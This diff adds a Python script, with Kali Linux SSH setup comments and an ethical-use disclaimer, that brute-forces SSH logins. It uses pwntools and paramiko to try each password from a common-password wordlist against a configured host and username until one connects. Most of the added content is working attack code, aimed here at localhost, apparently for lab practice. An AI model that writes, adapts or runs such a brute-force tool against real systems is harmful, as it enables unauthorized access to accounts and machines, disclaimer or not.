@@ -21,4 +21,56 @@
 # Please note that even with a disclaimer, the use of such a script may still be illegal or unethical in certain situations, so always exercise caution and adhere to legal and ethical standards. It's essential to respect privacy and obtain proper authorization when testing or using security tools like this.
 #
 # ####################################################################################
+#
+# In order for this to work on my Kali machine I had to take some additional steps
+#
+# ####################################################################################
+#
+# Kali by default does not have SSH enabled. These are the steps I took
+#
+# Note some of these steps required sudo
+#
+# sudo apt-get install ssh
+# update-rc.d -f ssh remove
+# update-rc.d -f ssh defaults
+# cd /etc/ssh/
+# mkdir insecure_original_default_kali_keys
+# mv ssh_host_* insecure_original_default_kali_keys/
+# dpkg-reconfigure openssh-server
+# sudo service ssh start
+#
+# To turn SSH off use the following command:
+# sudo service ssh stop
+#
+# ####################################################################################
+#
+# pwntools is required for this script to work
+#
+# pip install pwntools
+#
+# ####################################################################################
 
+from pwn import *
+import paramiko
+
+# Target IP Address
+host = "127.0.0.1"
+# Username of Target IP
+username = "kali"
+# Attempts Count
+attempts = 0
+
+with open("ssh-common-passwords.txt", "r") as password_list:
+	for password in password_list:
+		password = password.strip("\n")
+		try:
+			print("[{}] Attempting password: '{}'!".format(attempts, password))
+			response = ssh(host=host,user=username, password=password, timeout=1)
+			if response.connected():
+				print("[>] Valid password found: '{}'!".format(password))
+				response.close()
+				break
+			response.close()
+		except paramiko.ssh_exception.AuthenticationException:
+			print("[X] Invalid password!")
+		attempts += 1
